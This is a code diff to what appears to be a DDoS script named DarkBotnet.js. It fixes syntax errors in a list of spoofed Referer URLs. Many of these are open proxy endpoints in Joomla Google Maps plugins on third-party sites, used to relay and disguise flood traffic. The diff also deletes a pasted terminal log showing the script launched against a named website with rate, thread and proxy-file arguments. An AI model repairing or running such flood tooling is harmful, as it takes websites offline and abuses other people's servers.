@@ -519,8 +519,7 @@ const refers = [
     'http://www.oceans-wien.com/plugins/system/plugin_googlemap2_proxy.php?url=;BYPASS',
     'http://www.mcdp.eu/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
     'http://www.dbaa.co.za/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
-    'http://waggum-bevenrode.sg-bevenrode.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url='
-    'http://bwsnt1.pdsda.net/plugins/system/plugin_googlemap3_proxy.php?url=',
+    'http://waggum-bevenrode.sg-bevenrode.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
     'http://www.astecdisseny.com/plugins/content/plugin_googlemap2_proxy.php?url=',
      'http://www.fillmorefairways.com/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://growtopiagame.com/', 'http://check-host.net/check-http?url=',
@@ -546,13 +545,13 @@ const refers = [
     'http://www.topsiteminecraft.com/site/pinterest.com/search?q=',
     'http://eu.battle.net/wow/en/search?q=',
         "http://host-tracker.com/check_page/?url="
-        "http://jigsaw.w3.org/css-validator/validator?url="
+        "http://jigsaw.w3.org/css-validator/validator?url="',
         "http://www.google.com/translate?u="
-        "http://anonymouse.org/cgi-bin/anon-www.cgi/"
-        "http://www.onlinewebcheck.com/?url="
-        "http://feedvalidator.org/check.cgi?url="
-        "http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL="
-        "http://www.translate.ru/url/translation.aspx?direction=er&sourceURL="
+        "http://anonymouse.org/cgi-bin/anon-www.cgi/",
+        "http://www.onlinewebcheck.com/?url=",
+        "http://feedvalidator.org/check.cgi?url=",
+        "http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=",
+        "http://www.translate.ru/url/translation.aspx?direction=er&sourceURL=",
       'http://www.bus-reicherteu/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://www.maxxxi.ru/plugins/system/plugin_googlemap2_proxy.php?url=',
      'http://potholepeople.co.nz/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
@@ -2686,22 +2685,3 @@ headers["Referer"] = randomReferer;
          });
      });
  }
-
-
-g2a20jul2@cloudshell:~/V2$ node DarkBotnet.js https://file.cunhua.today 1200 32 10 proxy.txt
-/home/g2a20jul2/V2/DarkBotnet.js:516
-    'http://agenzia-anna.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url='
-    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-
-SyntaxError: Unexpected string
-    at internalCompileFunction (node:internal/vm:73:18)
-    at wrapSafe (node:internal/modules/cjs/loader:1153:20)
-    at Module._compile (node:internal/modules/cjs/loader:1205:27)
-    at Module._extensions..js (node:internal/modules/cjs/loader:1295:10)
-    at Module.load (node:internal/modules/cjs/loader:1091:32)
-    at Module._load (node:internal/modules/cjs/loader:938:12)
-    at Function.executeUserEntryPoint [as runMain] (node:internal/modules/run_main:83:12)
-    at node:internal/main/run_main_module:23:47
-
-Node.js v20.9.0
-g2a20jul2@cloudshell:~/V2$ 
